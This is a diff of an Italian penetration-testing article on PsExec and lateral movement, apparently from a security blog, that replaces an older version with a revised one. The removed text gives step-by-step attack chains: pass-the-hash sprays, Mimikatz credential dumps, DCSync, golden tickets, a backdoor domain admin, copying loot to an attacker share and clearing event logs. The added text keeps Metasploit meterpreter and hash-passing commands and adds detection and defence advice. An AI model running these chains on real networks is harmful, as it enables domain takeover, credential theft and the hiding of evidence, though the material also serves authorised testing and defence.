-# Step 4: Propagazione
-psexec.py -hashes :[NEW_HASH] CORP/user@192.168.1.102
+psexec.py 'CORP/administrator:Summer2026!@192.168.10.50'
 ```
 
-### SMBexec per Stealth
-
-**Differenza:** smbexec.py non droppa binario, crea service per ogni comando.
+Con Kerberos, partendo da un ticket già in cache:
 
 ```bash
-# Impacket smbexec
-smbexec.py CORP/admin:P@ssw0rd@192.168.1.100
-
-# Con PTH
-smbexec.py -hashes :hash CORP/admin@target
+export KRB5CCNAME=administrator.ccache
+psexec.py -k -no-pass CORP.LOCAL/administrator@fileserver01.corp.local
 ```
 
-**Pro:** No PSEXESVC.exe dropped, meno forensic artifacts.
-**Contro:** Crea/elimina service ad ogni comando (più Event 7045).
-
-### WMI per Maximum Stealth
+Nota il nome del servizio e del binario caricati: sono casuali a ogni esecuzione, a differenza del `PSEXESVC` fisso di PsExec. Se vuoi scegliere tu i nomi, Impacket ha `-service-name` e `-remote-binary-name`. Il flusso tipico, dopo aver estratto un hash con [Mimikatz](https://hackita.it/articoli/mimikatz/):
 
 ```bash
-# Impacket wmiexec
-wmiexec.py CORP/admin:P@ssw0rd@192.168.1.100
+# Validate the hash on the whole subnet; "Pwn3d!" marks admin access
+nxc smb 192.168.10.0/24 -u administrator -H 41aed72cec76816423703d8e545eea31
 
-# Con PTH
-wmiexec.py -hashes :hash CORP/admin@target
+# Pass the hash onto a host that answered Pwn3d!
+psexec.py -hashes :41aed72cec76816423703d8e545eea31 CORP/administrator@192.168.10.52
 ```
 
-**Pro:** No service creation, no binary drop, solo RPC/WMI.
-**Contro:** Output via file temporaneo in C:\Windows\Temp.
+La validazione di massa si fa con [NetExec](https://hackita.it/articoli/netexec/) (il successore di [CrackMapExec](https://hackita.it/articoli/crackmapexec/)). Se preferisci non copiare nessun binario sul target, [smbexec](https://hackita.it/articoli/smbexec/) e [wmiexec](https://hackita.it/articoli/wmiexec/) fanno lo stesso lavoro con meno impronta.
 
-## Scenari Pratici
+## PsExec con Metasploit
 
-### Scenario 1: SMB Lateral Movement Post-Cred Harvest
+[Metasploit](https://hackita.it/articoli/metasploit/) ha il modulo `exploit/windows/smb/psexec`, che automatizza upload, creazione del servizio e sessione, e accetta sia password sia hash NTLM.
 
-**Contesto:** Hai dumped credenziali admin, vuoi shell su altro workstation.
+```text
+msf6 > use exploit/windows/smb/psexec
+msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.10.50
+msf6 exploit(windows/smb/psexec) > set SMBDomain CORP
+msf6 exploit(windows/smb/psexec) > set SMBUser administrator
+msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:41aed72cec76816423703d8e545eea31
+msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/psexec) > set LHOST 192.168.10.5
+msf6 exploit(windows/smb/psexec) > run
+```
 
-**Timeline:** 30-60 secondi
+Sotto il cofano fa quello che hai già visto: `ADMIN$`, servizio, named pipe. È comodo quando vuoi direttamente una sessione Meterpreter invece di una semplice shell. Il modulo ha però un payload eseguibile da caricare sul target, quindi un antivirus lo ferma più facilmente di una shell `psexec.py`.
 
-**Comando:**
+## PSEXESVC.exe: cos'è, come funziona e come rilevarlo
+
+`PSEXESVC.exe` (a volte cercato come `psexecsvc exe`) è il servizio che PsExec installa sul target. Il binario è incorporato dentro `PsExec.exe`: al momento dell'esecuzione viene copiato in `ADMIN$`, cioè in `C:\Windows\PSEXESVC.exe`, registrato come servizio chiamato `PSEXESVC` e avviato. È il programma che riceve il tuo comando dalla pipe, lo esegue e rimanda l'output.
+
+| Elemento             | Valore tipico                                          |
+| -------------------- | ------------------------------------------------------ |
+| Servizio             | `PSEXESVC` (cambia con `-r`)                           |
+| Percorso del binario | `C:\Windows\PSEXESVC.exe`                              |
+| Account del servizio | `LocalSystem`                                          |
+| Tipo di avvio        | manuale (`demand start`)                               |
+| Named pipe           | `\PSEXESVC` e `\PSEXESVC-HOST-PID-stdin/stdout/stderr` |
+
+Di solito sparisce da solo a fine esecuzione. Se la connessione si interrompe o il processo viene ucciso, può restare il servizio o il file: controlli e pulisci (sul tuo lab o sul sistema autorizzato) così:
 
 ```cmd
-# Credenziali ottenute: CORP\it-admin / ITAdmin2024!
-
-# Test connettività SMB
-net use \\192.168.10.50\C$ /user:CORP\it-admin ITAdmin2024!
-
-# PsExec shell
-PsExec.exe \\192.168.10.50 -u CORP\it-admin -p ITAdmin2024! cmd.exe
-```
-
-**Output atteso:**
-
-```
-PsExec v2.43 - Execute processes remotely
-
-Starting cmd on 192.168.10.50...
-cmd started on 192.168.10.50 with process ID 3456.
-
-Microsoft Windows [Version 10.0.19045]
-C:\Windows\system32> hostname
-WKSTN-FINANCE-02
-
-C:\Windows\system32> whoami
-corp\it-admin
-```
-
-**Exploitation:**
-
-```cmd
-# Upload tool
-C:\> copy \\attacker\share\mimikatz.exe C:\Windows\Temp\
-
-# Dump LSASS
-C:\> cd C:\Windows\Temp
-C:\Windows\Temp> mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
-```
-
-**Cosa fare se fallisce:**
-
-**Errore:** "Access is denied"
-
-* **Causa:** Credenziali invalide o account non admin locale
-* **Fix:** Verifica credenziali, prova altri account dumpati
-
-```cmd
-# Test manual
-net use \\target\ADMIN$ /user:DOMAIN\user password
-```
-
-**Errore:** "The network path was not found"
-
-* **Causa:** Target offline o firewall blocca SMB (445)
-* **Fix:** Ping test, scan porte
-
-```bash
-nmap -p445 192.168.10.50
-```
-
-**Errore:** "The handle is invalid"
-
-* **Causa:** UAC Remote Restrictions (default Win10+)
-* **Fix:** Usa account Domain Admin oppure modifica registro target (richiede accesso preventivo)
-
-### Scenario 2: Pass-the-Hash Lateral Spray
-
-**Contesto:** Hai NTLM hash Administrator, vuoi controllare 20 workstation.
-
-**Timeline:** 3-5 minuti per 20 target
-
-**Step 1 - Preparazione target list:**
-
-```bash
-# Enumera workstation active
-crackmapexec smb 192.168.10.0/24 --gen-relay-list targets.txt
-
-# Oppure manuale
-cat > targets.txt <<EOF
-192.168.10.51
-192.168.10.52
-192.168.10.53
-EOF
-```
-
-**Step 2 - Pass-the-Hash spray:**
-
-```bash
-# Loop PTH con Impacket
-while read target; do
-    echo "[*] Attacking: $target"
-    psexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 CORP/Administrator@$target "whoami" 2>&1 | tee -a pth_results.txt
-done < targets.txt
-```
-
-**Output:**
-
-```
-[*] Attacking: 192.168.10.51
-[+] Success on 192.168.10.51 - nt authority\system
-
-[*] Attacking: 192.168.10.52
-[-] Error: STATUS_LOGON_FAILURE
-
-[*] Attacking: 192.168.10.53
-[+] Success on 192.168.10.53 - nt authority\system
-```
-
-**Step 3 - Interactive access su successi:**
-
-```bash
-# Filtra successi
-grep "Success" pth_results.txt | awk '{print $4}' > pwned.txt
-
-# Shell su primo target pwned
-psexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 CORP/Administrator@$(head -1 pwned.txt)
-```
-
-**Cosa fare se fallisce:**
-
-**Molti STATUS\_LOGON\_FAILURE:**
-
-* **Causa:** Hash non valido su quei sistemi (local admin diverso)
-* **Fix:** Usa [CrackMapExec](/articoli/crackmapexec/) per validation massiva
-
-```bash
-crackmapexec smb targets.txt -u Administrator -H 32ed87bdb5fdc5e9cba88547376818d4
-```
-
-**"NT\_STATUS\_CONNECTION\_REFUSED":**
-
-* **Causa:** Firewall host-based blocca SMB
-* **Fix:** Prova alternative WinRM se porta 5985 aperta
-
-```bash
-evil-winrm -i target -u Administrator -H hash
-```
-
-### Scenario 3: Domain Controller Access via PsExec
-
-**Contesto:** Hai credenziali DA, vuoi DCSync attack su DC.
-
-**Timeline:** 2-3 minuti
-
-**Step 1 - Verifica Domain Admin:**
-
-```powershell
-# Conferma privileges
-net user Administrator /domain
-
-# Output:
-# ...
-# Global Group memberships     *Domain Admins
-```
-
-**Step 2 - PsExec to DC:**
-
-```cmd
-PsExec.exe \\DC01.corp.local -u CORP\Administrator -p DomainPass123! cmd.exe
-```
-
-**Step 3 - DCSync:**
-
-```cmd
-C:\Windows\system32> hostname
-DC01
-
-# Upload Mimikatz
-C:\> copy \\attacker\tools\mimikatz.exe C:\Windows\Temp\m.exe
-
-# DCSync krbtgt hash
-C:\> C:\Windows\Temp\m.exe "lsadump::dcsync /user:krbtgt" exit
-```
-
-**Output:**
-
-```
-SAM Username         : krbtgt
-Hash NTLM: 502a93f3e5b5a1e9c5d8e7f6a4b3c2d1
-```
-
-**Step 4 - Golden Ticket:**
-
-```cmd
-C:\> C:\Windows\Temp\m.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:502a93f3e5b5a1e9c5d8e7f6a4b3c2d1 /ptt" exit
-
-[+] Ticket generated and injected
-```
-
-**Step 5 - Persistence:**
-
-```cmd
-# Accesso illimitato a qualsiasi risorsa dominio
-dir \\DC01\C$
-dir \\FILESERVER\Share$
-```
-
-**Cosa fare se fallisce:**
-
-**"Logon failure: unknown user name or bad password":**
-
-* **Causa:** Password DA cambiata o account locked
-* **Fix:** Verifica status account
-
-```cmd
-net user Administrator /domain
-```
-
-**"The user has not been granted the requested logon type":**
-
-* **Causa:** GPO restringe logon interattivo DC
-* **Fix:** Usa WinRM invece
-
-```bash
-evil-winrm -i DC01 -u Administrator -p password
-```
-
-**DCSync fallisce con "ERROR kuhl\_m\_lsadump\_dcsync":**
-
-* **Causa:** Privileges insufficienti (non vero DA)
-* **Fix:** Verifica group membership
-
-```cmd
-whoami /groups | findstr "Domain Admins"
-```
-
-## Toolchain Integration
-
-### Flusso Lateral Movement Chain
-
-```
-Credential Harvest → PsExec (access) → Mimikatz (dump) → Pass-the-Hash (propagate)
-```
-
-**Passaggio dati concreto:**
-
-```bash
-# Step 1: Initial compromise - credential dump
-.\mimikatz.exe "sekurlsa::logonpasswords" exit > creds.txt
-
-# Parse NTLM
-$hash = Select-String "NTLM :" creds.txt | Select -First 1 | %{$_ -replace ".*NTLM : ",""}
-
-# Step 2: PTH lateral
-psexec.py -hashes :$hash CORP/admin@192.168.1.101
-
-# Step 3: Su new target, dump again
-C:\> .\mimikatz.exe "sekurlsa::logonpasswords" exit > creds2.txt
-
-# Step 4: Ripeti
-```
-
-### PsExec vs Alternative
-
-| Tool                                                 | Protocol  | Binary Drop       | Service          | Stealth    | PTH Support         |
-| ---------------------------------------------------- | --------- | ----------------- | ---------------- | ---------- | ------------------- |
-| **PsExec**                                           | SMB 445   | Sì (PSEXESVC.exe) | Sì               | Basso      | No (Impacket sì)    |
-| **[smbexec](/articoli/smbexec/)**   | SMB 445   | No                | Sì (per-command) | Medio      | Sì                  |
-| **[wmiexec](/articoli/wmiexec/)**   | RPC 135   | No                | No               | Alto       | Sì                  |
-| **[dcomexec](/articoli/dcomexec/)** | RPC 135   | No                | No               | Alto       | Sì                  |
-| **[WinRM](/articoli/evilwinrm/)**  | HTTP 5985 | No                | No               | Medio      | Sì (con evil-winrm) |
-| **[SSH](/articoli/ssh/)**           | TCP 22    | No                | No               | Molto Alto | No                  |
-
-**Quando usare PsExec:**
-
-* Reliability massima richiesta
-* Target ha SMB aperto ma RPC/WinRM chiusi
-* Detection non è concern (pentest non-stealth)
-* Vuoi semplicità (binary singolo, no dependencies)
-
-**Quando usare alternative:**
-
-* **wmiexec**: Stealth maximum, no artifacts
-* **evil-winrm**: Interactive shell completo, file transfer builtin
-* **smbexec**: Balance stealth/reliability
-
-### Integration con CrackMapExec
-
-```bash
-# Credential validation massiva
-crackmapexec smb 192.168.10.0/24 -u Administrator -p 'P@ssw0rd' --continue-on-success
-
-# Output:
-# SMB  192.168.10.50  445  WKSTN-01  [+] CORP\Administrator:P@ssw0rd (Pwn3d!)
-# SMB  192.168.10.51  445  WKSTN-02  [+] CORP\Administrator:P@ssw0rd (Pwn3d!)
-
-# PsExec su validated targets
-psexec.py CORP/Administrator:P@ssw0rd@192.168.10.50
-
-# Oppure PTH
-crackmapexec smb 192.168.10.0/24 -u admin -H hash --exec-method smbexec -x "whoami"
-```
-
-Vedi [CrackMapExec guide](/articoli/crackmapexec/) per enumeration completa.
-
-### Integration con Mimikatz
-
-```bash
-# Chain: PsExec → Mimikatz → Credential Extraction
-
-# 1. PsExec shell
-psexec.py CORP/admin:pass@target
-
-# 2. Upload Mimikatz
-C:\> copy \\attacker\tools\mimikatz.exe C:\Windows\Temp\
-
-# 3. Dump
-C:\> C:\Windows\Temp\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "sekurlsa::tickets /export" exit
-
-# 4. Download tickets
-C:\> copy *.kirbi \\attacker\loot\
-```
-
-## Attack Chain Completa
-
-### Phishing → Domain Takeover via Lateral Movement
-
-**Timeline totale:** 4-6 ore
-
-**Fase 1: Initial Access (T+0)**
-
-Phishing con macro → Meterpreter shell su workstation utente.
-
-**Fase 2: Local Privilege Escalation (T+20min)**
-
-```bash
-# Exploit UAC bypass o kernel exploit
-meterpreter> getsystem
-[+] Got SYSTEM via technique 1
-```
-
-**Fase 3: Credential Harvesting (T+35min)**
-
-```bash
-# Mimikatz dump
-meterpreter> load mimikatz
-meterpreter> mimikatz_command -f sekurlsa::logonpasswords
-```
-
-**Credenziali trovate:**
-
-```
-Username: helpdesk_admin
-NTLM: a4f49c406510bdcab6824ee7c30fd852
-```
-
-**Fase 4: Lateral Movement (T+50min)**
-
-```bash
-# Validate credentials
-crackmapexec smb 192.168.10.0/24 -u helpdesk_admin -H a4f49c406510bdcab6824ee7c30fd852
-
-# Pwn3d! on:
-# 192.168.10.30 (IT-MGMT-01)
-# 192.168.10.31 (IT-MGMT-02)
-
-# PsExec to management server
-psexec.py -hashes :a4f49c406510bdcab6824ee7c30fd852 CORP/helpdesk_admin@192.168.10.30
-```
-
-**Fase 5: Privilege Escalation to DA (T+1h 15min)**
-
-Su IT-MGMT-01:
-
-```bash
-# Enumerate logged users
-C:\> query user
-
-# Output:
-# USERNAME          SESSIONNAME        ID  STATE
-# domain_admin      rdp-tcp#2          2   Active
-
-# Token theft con Invoke-TokenManipulation
-C:\> powershell -ep bypass
-PS> IEX (Get-Content token.ps1 -Raw)
-PS> Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "CORP\domain_admin"
-
-# New cmd apre con DA privileges
-```
-
-**Fase 6: DC Compromise (T+1h 45min)**
-
-```cmd
-# PsExec to DC
-PsExec.exe \\DC01.corp.local cmd.exe
-
-# DCSync
-C:\> mimikatz.exe "lsadump::dcsync /all /csv" exit > dc_hashes.csv
-
-# Download
-C:\> copy dc_hashes.csv \\attacker\loot\
-```
-
-**Fase 7: Persistence (T+2h)**
-
-```cmd
-# Golden ticket
-C:\> mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21... /krbtgt:[HASH] /ptt" exit
-
-# Create backdoor admin
-C:\> net user hacker P@ssw0rd123! /add /domain
-C:\> net group "Domain Admins" hacker /add /domain
-```
-
-**Risultato:** Dominio completamente compromesso via PsExec lateral movement chain.
-
-## Detection & Evasion
-
-### Blue Team Monitoring
-
-**Event ID critici:**
-
-| Event ID      | Log                | Descrizione                                |
-| ------------- | ------------------ | ------------------------------------------ |
-| **7045**      | System             | Service installed (PSEXESVC detection key) |
-| **4624**      | Security           | Logon Type 3 (Network)                     |
-| **4672**      | Security           | Special privileges assigned                |
-| **5145**      | Security           | Network share object accessed (ADMIN$)     |
-| **Sysmon 17** | Sysmon Operational | Pipe Created (psexecsvc pipe)              |
-| **Sysmon 18** | Sysmon Operational | Pipe Connected                             |
-| **Sysmon 11** | Sysmon Operational | File Created (PSEXESVC.exe)                |
-| **Sysmon 13** | Sysmon Operational | Registry value set (service key)           |
-
-**Event 7045 specifico:**
-
-```xml
-<Event>
-  <System>
-    <EventID>7045</EventID>
-  </System>
-  <EventData>
-    <Data Name="ServiceName">PSEXESVC</Data>
-    <Data Name="ImagePath">%systemroot%\PSEXESVC.exe</Data>
-    <Data Name="ServiceType">user mode service</Data>
-    <Data Name="StartType">demand start</Data>
-    <Data Name="AccountName">LocalSystem</Data>
-  </EventData>
-</Event>
-```
-
-**Named pipe detection (Sysmon 17):**
-
-```
-PipeName: \PSEXESVC-HOSTNAME-{random}-stdin
-```
-
-Pattern `PSEXESVC-*` è signature altamente affidabile.
-
-**Filesystem artifacts:**
-
-```
-C:\Windows\System32\PSEXESVC.exe (durante execution)
-C:\Windows\Prefetch\PSEXESVC.exe-[HASH].pf (dopo execution)
-```
-
-### Tecniche Evasion
-
-**1. Custom Service Name**
-
-```cmd
-# Non usa "PSEXESVC"
-PsExec.exe \\target -u admin -p pass -r WindowsUpdate cmd.exe
-```
-
-Event 7045 mostra ServiceName: "WindowsUpdate" invece di "PSEXESVC".
-
-**2. Alternative: wmiexec per No Service**
-
-```bash
-# No Event 7045, no PSEXESVC
-wmiexec.py CORP/admin:pass@target
-
-# Oppure con PTH
-wmiexec.py -hashes :hash CORP/admin@target
-```
-
-**3. Delayed Execution**
-
-```cmd
-# Scheduled task invece di immediate execution
-PsExec.exe \\target -u admin -p pass -d C:\Windows\Temp\payload.exe
-
-# Payload esegue ma PsExec disconnette subito
-```
-
-Riduce window detection, meno telemetry correlata.
-
-**4. Network Segmentation Awareness**
-
-```bash
-# Evita cross-segment lateral (trigger IDS)
-# Prioritizza target same subnet
-
-# Subnet A: 192.168.10.0/24
-psexec.py admin:pass@192.168.10.50
-
-# Non: 192.168.20.50 (subnet B, trigger network IDS)
-```
-
-### Cleanup Post-Exploitation
-
-```cmd
-# PsExec cleanup automatico (service stop + delete)
-# Ma verifica manualmente:
-
-# Check service residuo
 sc query PSEXESVC
-
-# Se presente, delete
+sc stop PSEXESVC
 sc delete PSEXESVC
-
-# Elimina binary se presente
-del /f C:\Windows\System32\PSEXESVC.exe
-
-# Clear Security event log (requires admin)
-wevtutil cl Security
-
-# Clear System event log
-wevtutil cl System
+del C:\Windows\PSEXESVC.exe
 ```
 
-**Prefetch cleanup:**
-
-```cmd
-# Elimina prefetch artifacts
-del /f C:\Windows\Prefetch\PSEXESVC.exe-*.pf
-```
-
-## Performance & Scaling
-
-### Single Target Performance
-
-**Connection + execution:**
-
-* **Tempo:** 3-5 secondi (cold start)
-* **Tempo:** 1-2 secondi (warm, share già mappato)
-* **CPU target:** Spike \~15% durante service creation
-* **Network:** \~50-200 KB per session
-
-### Multi-Target Scaling
-
-**20 workstation:**
-
-| Metodo                  | Tempo            | Parallelismo   |
-| ----------------------- | ---------------- | -------------- |
-| PsExec sequential       | \~60-100 secondi | 1              |
-| PsExec @file            | \~60-100 secondi | 1 (sequential) |
-| Impacket + GNU parallel | \~15-20 secondi  | 10 threads     |
-| CrackMapExec spray      | \~10-15 secondi  | 20 threads     |
-
-**Parallel execution:**
-
-```bash
-# GNU parallel con Impacket
-cat targets.txt | parallel -j 10 'psexec.py -hashes :hash CORP/admin@{} "hostname"'
-
-# Oppure CrackMapExec
-crackmapexec smb targets.txt -u admin -H hash -x "whoami" --threads 20
-```
-
-### Resource Consumption
-
-| Operation            | Attacker CPU | Attacker RAM | Network B/W |
-| -------------------- | ------------ | ------------ | ----------- |
-| Single PsExec        | \<5%         | \~20 MB      | \~100 KB    |
-| 10 parallel Impacket | \~25%        | \~200 MB     | \~1 MB/s    |
-| 50 parallel CME      | \~60%        | \~800 MB     | \~5 MB/s    |
-
-**Scalability limit:** Network bandwidth e target response time, non attacker resources.
-
-## Troubleshooting
-
-### "Access is denied"
-
-**Causa:** Credenziali invalide, UAC Remote Restrictions, o user non local admin.
-
-**Diagnosi:**
-
-```cmd
-# Test manual share access
-net use \\target\ADMIN$ /user:DOMAIN\user password
-
-# Se fallisce: credenziali wrong
-# Se succede: verifica group membership
-```
-
-**Fix:**
+Come distinguere l'uso legittimo da uno malevolo? Il vero `PSEXESVC.exe` è firmato da Microsoft: se la firma manca o non è valida, è un campanello d'allarme.
 
 ```powershell
-# Verifica local admin
-Invoke-Command -ComputerName target -Credential (Get-Credential) -ScriptBlock {
-    net localgroup Administrators
-}
+# Check the digital signature of the service binary
+Get-AuthenticodeSignature C:\Windows\PSEXESVC.exe | Format-List Status, SignerCertificate
 ```
 
-**UAC Remote Restrictions (Windows 10+):**
+Anche se firmato, la sua presenza su una workstation dove nessun amministratore lo usa è già un indicatore. Microsoft stessa avverte che molti antivirus segnalano PsTools come "remote admin": i tool non contengono virus, ma sono stati usati dai virus, e per questo scatta l'allarme. Gli equivalenti Impacket usano invece nomi casuali per servizio e binario, e pipe `RemCom_*` al posto di `PSEXESVC`, quindi una regola basata solo sul nome `PSEXESVC` non li vede.
 
-Solo account Domain Admin bypassa UAC remote restrictions per default. Local admin accounts (RID != 500) sono limitati.
+## PsExec vs WMIExec, SMBExec e WinRM
 
-**Fix:**
+| Tool                                                 | Protocollo   | Copia un binario    | Crea un servizio    | Discrezione | Pass the Hash |
+| ---------------------------------------------------- | ------------ | ------------------- | ------------------- | ----------- | ------------- |
+| PsExec (Sysinternals)                                | SMB 445      | Sì (`PSEXESVC.exe`) | Sì                  | Bassa       | No            |
+| psexec.py (Impacket)                                 | SMB 445      | Sì (nome casuale)   | Sì                  | Bassa/media | Sì            |
+| [smbexec](https://hackita.it/articoli/smbexec/)      | SMB 445      | No                  | Sì (a ogni comando) | Media       | Sì            |
+| [wmiexec](https://hackita.it/articoli/wmiexec/)      | RPC/WMI 135  | No                  | No                  | Alta        | Sì            |
+| [dcomexec](https://hackita.it/articoli/dcomexec/)    | RPC/DCOM 135 | No                  | No                  | Alta        | Sì            |
+| [Evil-WinRM](https://hackita.it/articoli/evilwinrm/) | HTTP 5985    | No                  | No                  | Media       | Sì            |
+| [SSH](https://hackita.it/articoli/ssh/)              | TCP 22       | No                  | No                  | Molto alta  | No            |
+
+**PsExec vs WMIExec.** `wmiexec` non crea servizi e non copia binari, quindi non genera l'Event ID 7045: è la scelta quando vuoi essere discreto. Contro: usa RPC (porta 135 più porte dinamiche) e scrive l'output in un file temporaneo.
+
+**PsExec vs SMBExec.** `smbexec` usa lo stesso canale SMB ma non lascia un binario su disco: crea un servizio per ogni comando. Meno artifact sul filesystem, ma più eventi di creazione servizio.
+
+**PsExec vs WinRM.** WinRM usa HTTP/HTTPS (porte 5985/5986) ed è di solito attivo sui server, non sui client Windows. Ti dà una PowerShell remota completa e non crea servizi. PsExec resta utile quando SMB è aperto ma WinRM e RPC sono bloccati, o quando vuoi eseguire come SYSTEM con una sola riga.
+
+Se la discrezione non è una priorità in quella fase dell'engagement, PsExec resta la scelta più diretta e affidabile.
+
+## Rilevamento di PsExec: Event ID 7045 e Windows Logs
+
+Per il blue team PsExec non è invisibile. Gli indicatori principali:
+
+| Evento                      | Log      | Cosa indica                                                                                                    |
+| --------------------------- | -------- | -------------------------------------------------------------------------------------------------------------- |
+| Event ID 7045               | System   | Nuovo servizio installato (per PsExec: `ServiceName: PSEXESVC`)                                                |
+| Event ID 4697               | Security | Servizio installato, se l'audit è attivo                                                                       |
+| Event ID 4624, Logon Type 3 | Security | Accesso di rete sul target, vedi i [tipi di logon di Windows](https://hackita.it/articoli/logon-type-windows/) |
+| Event ID 4672               | Security | Privilegi speciali assegnati alla sessione                                                                     |
+| Event ID 5145               | Security | Accesso alla share `ADMIN$` (serve l'audit delle share)                                                        |
+| Sysmon Event ID 11          | Sysmon   | Creazione del file `PSEXESVC.exe`                                                                              |
+| Sysmon Event ID 17 e 18     | Sysmon   | Named pipe creata e connessa, pattern `PSEXESVC`                                                               |
+
+L'Event ID 7045 è il più affidabile: ogni volta che PsExec (o un tool equivalente) crea un servizio, nel log System compaiono nome del servizio, percorso del binario e account. Lo stesso evento è alla base delle regole di rilevamento del movimento laterale via servizi, ed è per questo che le campagne ransomware che abusano di PsExec lasciano sempre una traccia in 7045. Per cercarlo sul target:
 
 ```powershell
-# Disabilita UAC remote restriction (richiede registry edit su target)
+# Look for PSEXESVC service installations in the System log
+Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} |
+    Where-Object { $_.Message -match 'PSEXESVC' } |
+    Select-Object TimeCreated, Message
+```
+
+Un nome di servizio custom con `-r` riduce il match sulle firme statiche, ma non elimina l'evento:
+
+```cmd
+PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! -r WindowsUpdateSvc cmd.exe
+```
+
+L'Event ID 7045 scatta lo stesso, con `ServiceName: WindowsUpdateSvc`. Per questo una regola di detection seria non guarda solo il nome ma un insieme di segnali: servizio creato da un accesso di rete (Logon Type 3), binario in `C:\Windows` appena scritto da `ADMIN$`, pipe anomale.
+
+## Risoluzione problemi PsExec: errori comuni
+
+**"Access is denied" / "System error 5 has occurred"**
+Credenziali sbagliate, oppure l'account non è amministratore locale. Verifica con `net use \\target\ADMIN$ /user:DOMINIO\utente password`. Su Windows con UAC il filtro sul token remoto (`LocalAccountTokenFilterPolicy`, valore 0 di default) toglie i privilegi amministrativi agli account locali, anche se sono nel gruppo Administrators: funziona con un account di dominio amministratore, oppure impostando il valore a 1 su una macchina di laboratorio. Fuori dal lab, riduce la sicurezza: non farlo senza motivo.
+
+```cmd
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 ```
 
-### "The network path was not found"
+**"Couldn't install PsExec service: Access is denied"**
+Oltre ai permessi, spesso è un antivirus o un EDR che blocca la creazione del servizio o la scrittura su `ADMIN$`. Controlla gli avvisi del prodotto di sicurezza sul target, e verifica che `ADMIN$` sia scrivibile.
 
-**Causa:** Target offline, firewall blocca SMB, o hostname resolution fail.
+**"The network path was not found"**
+Target spento, firewall che blocca la 445, oppure il nome host non si risolve. Prova `ping`, poi `nmap -p445 target`, poi usa direttamente l'IP.
 
-**Diagnosi:**
+**"The specified service already exists"**
+Un'esecuzione precedente non ha ripulito. Controlla con `sc query PSEXESVC` e rimuovi con `sc delete PSEXESVC` prima di riprovare.
 
-```bash
-# Test ping
-ping target
+**"The handle is invalid"**
+Spesso un problema di UAC o di versione di Windows. Prova con `-h` (token elevato) oppure passa a `psexec.py` di Impacket.
 
-# Test porta 445
-nmap -p445 target
+**Il servizio non parte**
+Se il file `PSEXESVC.exe` viene messo in quarantena dall'antivirus subito dopo la copia, il servizio non si avvia. Guarda i log del prodotto di sicurezza, poi `sc query PSEXESVC`.
 
-# Test DNS
-nslookup target
-```
+**Impacket "STATUS\_LOGON\_FAILURE"**
+Hash o password non validi su quel target, oppure account bloccato. Valida prima con `nxc smb target -u utente -H hash`, così non rischi di bloccare un account con tentativi ripetuti.
 
-**Fix:**
+## Come difendersi da PsExec
 
-* **Firewall:** Apri porta 445 (richiede accesso target)
-* **Offline:** Verifica uptime target
-* **DNS:** Usa IP invece di hostname
-
-### "The specified service already exists"
-
-**Causa:** Service PSEXESVC da execution precedente non cleanup.
-
-**Diagnosi:**
-
-```cmd
-# Check service
-sc query PSEXESVC
-
-# Output se esiste:
-# STATE: 4 RUNNING
-```
-
-**Fix:**
-
-```cmd
-# Stop service
-sc stop PSEXESVC
-
-# Delete service
-sc delete PSEXESVC
-
-# Retry PsExec
-```
-
-### "The handle is invalid"
-
-**Causa:** UAC issue o incompatibilità versione Windows.
-
-**Fix:**
-
-```cmd
-# Usa flag -h (elevated token)
-PsExec.exe \\target -u admin -p pass -h cmd.exe
-
-# Oppure passa a Impacket
-psexec.py admin:pass@target
-```
-
-### Impacket "STATUS\_LOGON\_FAILURE"
-
-**Causa:** Hash invalido, account locked, o password policy violation.
-
-**Diagnosi:**
-
-```bash
-# Test con CrackMapExec
-crackmapexec smb target -u user -H hash
-
-# Verifica account status
-rpcclient -U user target
-> lookupnames user
-```
-
-**Fix:**
-
-* **Hash wrong:** Re-dump con [Mimikatz](/articoli/mimikatz/)
-* **Account locked:** Attendi unlock o usa altro account
-* **Policy:** Verifica password policy dominio
+* Non riusare la stessa password dell'amministratore locale su più macchine: è la condizione che rende possibile ogni catena di movimento laterale vista sopra. Usa LAPS per avere password uniche per ogni computer
+* Lascia `LocalAccountTokenFilterPolicy` a 0 (il valore di default): il filtro UAC remoto sugli account locali ferma molti tentativi con credenziali locali riutilizzate
+* Monitora l'Event ID 7045 (e il 4697) su tutti gli endpoint, con allarme sui servizi creati da accessi di rete e sui binari scritti in `C:\Windows` da `ADMIN$`
+* Limita il traffico SMB tra workstation: le workstation devono parlare solo con i server autorizzati, così un host compromesso non si propaga a raggiera
+* Applica il privilegio minimo: se un account non deve essere Domain Admin, non deve esserlo. Riduce molto la superficie di pass the hash
+* Attiva SMB signing obbligatorio: non blocca PsExec con credenziali valide, ma chiude la strada al relay NTLM verso SMB
+* Metti in blocklist o in allowlist controllata `PsExec.exe` con l'EDR o con AppLocker, e consenti l'uso solo dalle postazioni degli amministratori
 
 ## FAQ
 
-**PsExec richiede password plaintext?**
+**PsExec è un virus?**
+No. È un tool Microsoft firmato. Molti antivirus lo segnalano come "remote admin" perché è stato usato spesso da malware e ransomware. Scaricalo sempre dalla pagina ufficiale Sysinternals.
 
-Sysinternals PsExec sì. Impacket psexec.py supporta pass-the-hash con flag `-hashes :NTLM`. Per operazioni stealth con solo hash, usa sempre Impacket.
+**Dove si scarica PsExec e come si installa?**
+Dalla pagina ufficiale Microsoft: scarichi `PSTools.zip`, estrai `PsExec.exe` (o `PsExec64.exe`) e lo copi in una cartella del `PATH`. Non c'è installer. Alla prima esecuzione serve accettare l'EULA, oppure usare `-accepteula`.
 
-**Differenza tra PsExec e psexec.py?**
+**PsExec richiede sempre la password in chiaro?**
+Sysinternals PsExec sì. `psexec.py` di Impacket supporta il pass the hash con `-hashes :NTHASH` e Kerberos con `-k`.
 
